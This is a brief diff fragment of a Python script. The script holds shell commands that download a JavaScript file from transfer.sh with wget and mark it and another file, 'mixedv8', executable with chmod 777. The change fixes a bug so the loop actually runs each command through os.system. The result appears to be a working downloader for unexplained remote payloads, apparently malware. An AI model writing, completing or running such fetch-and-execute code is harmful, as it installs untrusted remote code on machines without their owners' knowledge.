@@ -6,5 +6,5 @@ wget https://transfer.sh/AQ7byg/mixedv16.js
 chmod 777 mixedv8
 chmod 777 mixedv16.js"""
 
-for i in commands.splitlines:
+for i in commands.splitlines():
     os.system(i)
